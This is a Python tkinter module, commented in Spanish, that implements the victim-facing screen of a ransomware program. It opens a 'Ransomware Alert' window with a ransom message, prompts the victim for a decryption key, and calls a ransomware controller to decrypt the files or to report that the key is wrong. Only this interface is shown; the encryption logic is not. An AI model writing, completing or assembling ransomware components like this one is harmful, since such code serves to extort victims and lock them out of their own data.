import tkinter as tk
from tkinter import simpledialog, messagebox

class UserInterface:
    def __init__(self, ransomware_controller):
        self.ransomware_controller = ransomware_controller  # Controlador para manejar la lógica
        self.root = tk.Tk()  # Crea la ventana principal
        self.root.title("Ransomware Alert")  # Título de la ventana
        self.root.geometry("400x200")  # Dimensiones de la ventana

        # Crear un label para el mensaje de rescate
        self.message_label = tk.Label(self.root, text="", wraplength=350)
        self.message_label.pack(pady=20)  # Agrega el label a la ventana

        # Botón para descifrar
        decrypt_button = tk.Button(self.root, text="Descifrar", command=self.request_decryption_key)
        decrypt_button.pack(pady=10)

    def show_ransom_message(self, message):
        self.message_label.config(text=message)
        self.root.mainloop()

    def request_decryption_key(self):
        # Abrir un diálogo para pedir la clave de descifrado
        decryption_key = simpledialog.askstring("Clave de Descifrado", "Introduce la clave de descifrado:")
        if decryption_key:
            self.attempt_decryption(decryption_key)  # Intentar descifrar con la clave ingresada

    def attempt_decryption(self, decryption_key):
        # Intentar descifrar usando el controlador de ransomware
        success = self.ransomware_controller.decrypt_files(decryption_key)
        if success:
            self.show_success_message()  # Si el descifrado es exitoso, mostrar el mensaje de éxito
        else:
            messagebox.showerror("Error", "Clave incorrecta. No puedes recuperar los archivos.")

    def show_success_message(self):
        messagebox.showinfo("Éxito", "¡Tus archivos han sido descifrados correctamente!")
        self.root.quit()
        self.root.destroy()
        exit()
